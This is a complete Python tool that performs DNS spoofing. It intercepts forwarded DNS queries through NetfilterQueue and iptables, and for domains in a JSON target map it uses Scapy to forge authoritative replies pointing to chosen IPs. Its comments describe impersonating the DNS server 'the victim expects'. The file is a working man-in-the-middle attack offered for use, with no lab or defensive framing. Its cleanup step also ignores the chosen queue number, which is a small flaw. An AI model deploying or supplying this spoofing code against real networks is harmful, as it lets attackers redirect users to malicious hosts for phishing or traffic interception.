#!/usr/bin/env python3
# dns_spoof_nfqueue.py
import argparse
import json
import os
import signal
from netfilterqueue import NetfilterQueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send

nfqueue = None
QUEUE_NUM = 0
dns_map = {}  # keys normalized (lower, no-trailing-dot) -> ip string

def normalize_name(qname_raw):
    # qname_raw can be bytes or str; return normalized str without trailing dot
    if isinstance(qname_raw, bytes):
        s = qname_raw.decode(errors='ignore')
    else:
        s = str(qname_raw)
    if s.endswith('.'):
        s = s[:-1]
    return s.lower()

def load_hosts(path):
    with open(path) as f:
        j = json.load(f)
    out = {}
    for k, v in j.items():
        nk = k.lower().rstrip('.')
        out[nk] = v
    return out

def process(pkt):
    """
    pkt is an instance of netfilterqueue.Packet
    We parse it with Scapy, look for DNS query (qr==0).
    If qname in dns_map -> craft DNS response and drop the original (so resolver is not contacted).
    Else accept (forward) the packet as-is.
    """
    try:
        scapy_pkt = IP(pkt.get_payload())
    except Exception:
        pkt.accept()
        return

    # only handle UDP DNS queries
    if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(DNS) and scapy_pkt[DNS].qr == 0:
        try:
            qname = scapy_pkt[DNSQR].qname
        except Exception:
            pkt.accept()
            return

        nq = normalize_name(qname)
        if nq in dns_map:
            fake_ip = dns_map[nq]
            # build a forged DNS response
            # Use src=original dst swapped (pretend to be the DNS server the victim expects)
            ip = IP(src=scapy_pkt[IP].dst, dst=scapy_pkt[IP].src)
            udp = UDP(sport=53, dport=scapy_pkt[UDP].sport)
            dnsresp = DNS(
                id=scapy_pkt[DNS].id,
                qr=1, aa=1, ra=1,  # response, authoritative, recursion-available (optional)
                qd=scapy_pkt[DNS].qd,
                an=DNSRR(rrname=scapy_pkt[DNS].qd.qname, type="A", ttl=300, rdata=fake_ip),
                ancount=1
            )
            resp = ip/udp/dnsresp
            # send at IP layer (this does not touch nfqueue)
            send(resp, verbose=0)
            print(f"[SPOOFED] {nq} -> {fake_ip} for {scapy_pkt[IP].src}")
            # drop original query so it doesn't reach real resolver
            pkt.drop()
            return
    # default: accept and let it be forwarded
    pkt.accept()

def signal_handler(sig, frame):
    global nfqueue
    if nfqueue:
        nfqueue.unbind()
    # remove only the NFQUEUE rule (be careful)
    os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {QUEUE_NUM} 2>/dev/null || true")
    print("\nStopped. NFQUEUE rule removed (if present).")
    exit(0)

def main():
    global nfqueue, dns_map
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", help="interface (not used directly here)", default="eth0")
    parser.add_argument("-j", "--hosts-json", required=True, help="json file mapping domain->ip")
    parser.add_argument("-q", "--queue", type=int, default=0, help="nfqueue number")
    args = parser.parse_args()

    dns_map = load_hosts(args.hosts_json)
    print("Loaded targets:", dns_map)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    QUEUE = args.queue
    # Ensure the iptables rule exists (user still can create it manually)
    print(f"Make sure you ran: iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE}")
    nfqueue = NetfilterQueue()
    nfqueue.bind(QUEUE, process)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    main()
